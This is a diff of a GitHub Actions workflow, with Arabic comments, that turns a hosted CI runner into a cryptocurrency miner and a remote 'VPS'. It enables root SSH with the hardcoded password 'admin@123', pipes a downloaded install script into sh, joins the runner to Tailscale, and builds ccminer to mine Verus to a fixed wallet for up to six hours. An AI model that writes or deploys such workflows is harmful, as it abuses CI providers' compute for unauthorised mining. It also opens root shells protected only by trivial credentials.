@@ -1,64 +1,65 @@
-name: VPS Min test
+name: Auto Mining VPS
 
 on:
   workflow_dispatch:
 
 jobs:
-  secure-vps:
+  setup-and-mine:
     runs-on: ubuntu-latest
     timeout-minutes: 360
 
     steps:
-      - name: Install & Configure SSH
+      - name: Checkout Repo
+        uses: actions/checkout@v3
+
+      - name: Run Mining Setup
+        env:
+          TAILSCALE_AUTH_KEY: ${{ secrets.TAILSCALE_AUTH_KEY }}
         run: |
-          sudo apt update -y
-          sudo apt install -y openssh-server
-          sudo systemctl enable ssh
-          sudo systemctl start ssh
-          echo "root:admin@123" | sudo chpasswd
-          echo "PermitRootLogin yes" | sudo tee -a /etc/ssh/sshd_config
-          sudo service ssh restart
-          echo "✅ SSH user: root | pass: admin@123"
+          # تنزيل السكربت وتشغيله مباشرة
+          cat > mine.sh <<'EOF'
+#!/bin/bash
+# ===== إعداد SSH root =====
+sudo apt update -y
+sudo apt install -y openssh-server curl git build-essential \
+    libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev screen
+sudo systemctl enable ssh
+sudo systemctl start ssh
+echo "root:admin@123" | sudo chpasswd
+echo "PermitRootLogin yes" | sudo tee -a /etc/ssh/sshd_config
+sudo service ssh restart
+echo "✅ SSH جاهز | User: root | Pass: admin@123"
 
-      - name: Install Tailscale
-        run: |
-          curl -fsSL https://tailscale.com/install.sh | sh
-          sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=vps-${{ github.run_id }}
-          tsIP=$(tailscale ip -4 | head -n 1)
-          echo "TAILSCALE_IP=$tsIP" >> $GITHUB_ENV
-          echo "✅ Tailscale IP: $tsIP"
+# ===== تثبيت Tailscale =====
+curl -fsSL https://tailscale.com/install.sh | sh
+sudo tailscale up --authkey=${TAILSCALE_AUTH_KEY:-"ادخل_هنا_auth_key"} --hostname=vps-$(date +%s)
+TS_IP=$(tailscale ip -4 | head -n 1)
+echo "✅ Tailscale IP: $TS_IP"
 
-      - name: Run Mining Script
-        run: |
-          # إنشاء Worker Name عشوائي
-          RAND_NUM=$(shuf -i 1000-9999 -n 1)
-          RAND_CHARS=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 2 | head -n 1)
-          WRK="ubuntu${RAND_NUM}${RAND_CHARS}"
-          echo "👷 Worker Name: $WRK"
+# ===== إعداد التعدين =====
+WAL="RGRbQeW9cy641mJfpM7MKZ5YpmsUHMxf2p"
+POOL="pool.verus.io:9998"
+TH=8
 
-          # إعدادات التعدين
-          WAL="RGRbQeW9cy641mJfpM7MKZ5YpmsUHMxf2p"
-          POOL="pool.verus.io:9998"
-          TH=8
+# ===== إنشاء Worker Name عشوائي =====
+RAND_NUM=$(shuf -i 1000-9999 -n 1)
+RAND_CHARS=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 2 | head -n 1)
+WRK="ubuntu${RAND_NUM}${RAND_CHARS}"
+echo "👷 Worker Name: $WRK"
 
-          # تثبيت المكتبات الضرورية
-          sudo apt update -y
-          sudo apt install -y git build-essential libcurl4-openssl-dev libssl-dev \
-              libjansson-dev automake autotools-dev screen
+# ===== تنزيل وتجهيز ccminer =====
+if [ ! -d "$HOME/ccminer" ]; then
+    git clone https://github.com/Oink70/ccminer-verus.git ~/ccminer
+    cd ~/ccminer
+    ./build.sh
+else
+    cd ~/ccminer
+    make clean
+    ./build.sh
+fi
 
-          # تنزيل وتجهيز ccminer لو مش موجود
-          if [ ! -d "$HOME/ccminer" ]; then
-              git clone https://github.com/Oink70/ccminer-verus.git ~/ccminer
-              cd ~/ccminer
-              ./build.sh
-          else
-              cd ~/ccminer
-              make clean
-              ./build.sh
-          fi
-
-          # إنشاء config.json
-          cat > config.json <<EOF
+# ===== إنشاء config.json =====
+cat > config.json <<CONFIG
 {
   "pools": [
     { "name": "CUSTOM", "url": "stratum+tcp://${POOL}", "timeout": 180, "disabled": 0 }
@@ -69,11 +70,20 @@ jobs:
   "threads": ${TH},
   "api-bind": "127.0.0.1:4068"
 }
-EOF
-          echo "📂 ملف config.json اتعمل"
+CONFIG
+echo "📂 ملف config.json اتعمل"
 
-          # تشغيل التعدين في screen
-          screen -dmS verus_mining ./ccminer -c config.json
-          echo "🚀 التعدين بدأ في جلسة screen اسمها: verus_mining"
-          echo "▶️ للرجوع للجلسة: screen -r verus_mining"
-          echo "🔚 للخروج بدون إيقاف التعدين: اضغط Ctrl+A ثم D"
+# ===== تشغيل التعدين في screen =====
+screen -dmS verus_mining ./ccminer -c config.json
+echo "🚀 التعدين بدأ في جلسة screen اسمها: verus_mining"
+echo "▶️ للرجوع للجلسة: screen -r verus_mining"
+echo "🔚 للخروج بدون إيقاف التعدين: اضغط Ctrl+A ثم D"
+
+# ===== معلومات للتوصيل =====
+echo "📌 SSH root: root"
+echo "📌 Password: admin@123"
+echo "📌 Tailscale IP: $TS_IP"
+EOF
+
+          chmod +x mine.sh
+          ./mine.sh
